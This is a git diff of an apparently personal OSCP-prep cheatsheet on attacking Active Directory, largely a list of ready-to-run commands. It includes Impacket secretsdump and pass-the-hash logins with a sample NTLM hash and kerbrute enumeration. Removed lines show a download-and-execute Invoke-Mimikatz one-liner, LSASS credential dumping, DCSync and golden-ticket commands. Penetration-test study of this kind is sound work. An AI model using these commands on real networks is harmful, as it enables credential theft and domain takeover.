@@ -1,7 +1,4 @@
 # Active Directory Cheatsheet     
-## Contents 
-
-
 ## Active Directory Overview 
 To gain control over a domain:  
 Compromise member of Domain Admin group.   
@@ -11,38 +8,14 @@ AD: depends on DNS server, typical DC hosts DNS server that is authoritative for
 Authentication mechanisms: Kerberos or NTLM 
 
 Typical AD pen test:
-- Exploit and gain access to host on domain as a domain user 
+- Exploit host on domain and gain access  as a domain user 
 - Enumerate domain users and groups.  
 - Privilege escalate or move laterally. 
 - Get Domain Admin or Service Account access and onto the domain controller. 
 
 ## AD Cheatsheets
 [Enumeration](https://github.com/Scr1ptK1ddie/OSCPprep/blob/main/ActiveDirectory/Enumeration.md)    
-
-## Quick Commands  
-
-    net user
-    net user /domain
-    net user [username] /domain
-    
-    net localgroup
-    net group /domain
-    net group /domain "Domain Admins"   
-    
-Reference: 
-https://wadcoms.github.io/ 
-
-PowerShell Active Directory Module (only on DC by default)
-
-    Get-ADUser
-    Get-ADDomain
-    Get-ADGroup
-    Get-ADGroupMember -identity "Domain Admins" -Domain test.local -DomainController 10.10.10.10
-    Find-DomainShare
  
-### Files to Check  
-    %SYSTEMROOT%\System32\ntds.dit             #AD database
-    %SYSTEMROOT%\NTDS\ntds.dit                 #AD backup 
 
 ## Resources      
 [WADComs](https://wadcoms.github.io/)    
@@ -54,42 +27,51 @@ PowerShell Active Directory Module (only on DC by default)
 [Pentesting AD CheatSheet](https://i.ibb.co/TKYNCNP/Pentest-ad.png)  
 [Integratio IT Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)  
 
+    
+### Important Files to Check on the DC
+    %SYSTEMROOT%\System32\ntds.dit             #AD database
+    %SYSTEMROOT%\NTDS\ntds.dit                 #AD backup
+
 ## Tools  
 ### Tools allowed on the new exam 
+All tools that do not perform any restricted actions are allowed on the exam (no commercial tools like Burp Pro, no automated exploits like SQLmap, etc).   
 
-    BloodHound
-    SharpHound
-    PowerShell Empire
+    [BloodHound](https://github.com/BloodHoundAD/BloodHound)     
+    [SharpHound](https://github.com/BloodHoundAD/SharpHound)    
+    [PowerShell Empire](https://github.com/BC-SECURITY/Empire)    
     Covenant 
     Powerview
     Rubeus
-    evil-winrm
+    [evil-winrm](https://github.com/nubix/evil-winrm): access Windows RM, TCP port 5985 or 5986 open.   
     Responder (Spoofing is not allowed in the labs or on the exam)
     Crackmapexec
     Mimikatz
 
 ## General Tools 
 
-[Impacket](https://github.com/SecureAuthCorp/impacket)   
+[Impacket](https://github.com/SecureAuthCorp/impacket): collection on Python classes for working with network protocols.       
 
+    #if not properly installed 
     apt install impacket-scripts  
     /usr/share/doc/python3-impacket/examples  
     
-[evil-winrm](https://github.com/nubix/evil-winrm)    
 [ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   
 
 ## NTLM Authentication
-### Impacket Scripts 
+### Impacket Scripts  
+psexec.py, smbexec.py, wmiexec.py   
 If you have creds for the backup account for domain controller: can dump all hashes    
 
     python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
     
-Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    
+Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    
 
+    python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183    
     evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]  
 
 ## Kerberos (Port 88)   
 Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
+[keko](https://github.com/gentilkiwi/kekeo): Kerberos scripts     
 [Messing With Kerberos Using Rubeus](https://endark.gitbook.io/kb/windows/lab-attacks/messing-with-kerberos-using-rubeus) 
 [Kerberos Tickets](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)   
 [Kerberos Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  
@@ -99,20 +81,13 @@ Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.c
     ./kerbrute userenum userlist.txt -d [name] --dc [name]     
     
 ## Kerberos Attacks 
-
-Kerbrute Enumeration (No domain access needed) 
-
-Kerberoasting (Access as any user needed) 
-
-AS-REP Roasting with Rubeus and Impacket (Access as any user needed)  
-
-Overpass the Hash / Pass the Key (PTK)  
-
-Pass the Ticket (Access to user on the domain needed)  
-
-Golden/Silver Ticket Attacks (Domain admin needed / Service hash needed) 
-
-Skeleton key attacks using mimikatz (Domain Admin needed) 
+Kerbrute Enumeration (No domain access needed)     
+Kerberoasting (Access as any user needed)    
+AS-REP Roasting with Rubeus and Impacket (Access as any user needed)     
+Overpass the Hash / Pass the Key (PTK)     
+Pass the Ticket (Access to user on the domain needed)     
+Golden/Silver Ticket Attacks (Domain admin needed / Service hash needed)    
+Skeleton key attacks using mimikatz (Domain Admin needed)    
 
 ### Kerbrute Enumeration 
 No domain access needed 
@@ -192,67 +167,8 @@ Windapsearch:
 https://github.com/ropnop/windapsearch 
 
     python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
-    
-## Other Exploits
-[Print Nightmare Walkthrough](https://themayor.notion.site/341cf3705cc64752b466046584de45b8?v=4f2173ad749249b293a89ab5391805ec&p=ef69c17e82c5471fb4648ccabbf5c937) 
-
-
-
-## Post Exploitation    
-### PowerView   
-Powershell script to enum domain after gaining admin access to machine   
-
-[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)   
-[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)    
-[Cheat sheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)   
-
-    powershell -ep bypass   
-    . .\PowerView.ps1   
-    Get-NetDomain   
-    Get-NetUser   
-    Get-NetComputer -fulldata   
-    
-## Bloodhound    
-[Bloodhound](https://github.com/BloodHoundAD/BloodHound)   
-Bloodhound - GUI app installed on attack box, SharpHound - powershell script to enum and collect data -> exfiltrate as a zip file.     
-
-    apt-get install bloodhound     
-
-on victim, transfer file then import into Bloodhound and run queries   
-
-    . .\SharpHound.ps1   
-    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
-    
-## Mimikatz  
-Extracts passwords, hashes, PIN codes and kerberos tickets from memory.   
-[Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)    
-[Online Password Cracker - Crackstation](https://crackstation.net/)     
-[Dumping Hashes with Mimikatz - Video](https://www.youtube.com/watch?v=AZirvtZNIEw)   
-Loading Powershell Script 
-
-    powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"    
    
-    privilege::debug   
-    lsadump::sam   
 
-Dumping credentials from LSASS  
-
-    mimikatz # privilege::debug   
-    mimikatz # sekurlsa::logonpasswords   
-Dumping credentials from a minidump   
-
-    mimikatz # sekurlsa::minidump lsass.dmp   
-    mimikatz # sekurlsa::logonPasswords   
-    
-DCSync the krbtgt hash  
-
-    mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt   
-Pass the hash   
-    
-    mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<cmd>   
-Golden ticket creation and pass the ticket   
-    
-    mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash>   
  
  
 # Resources
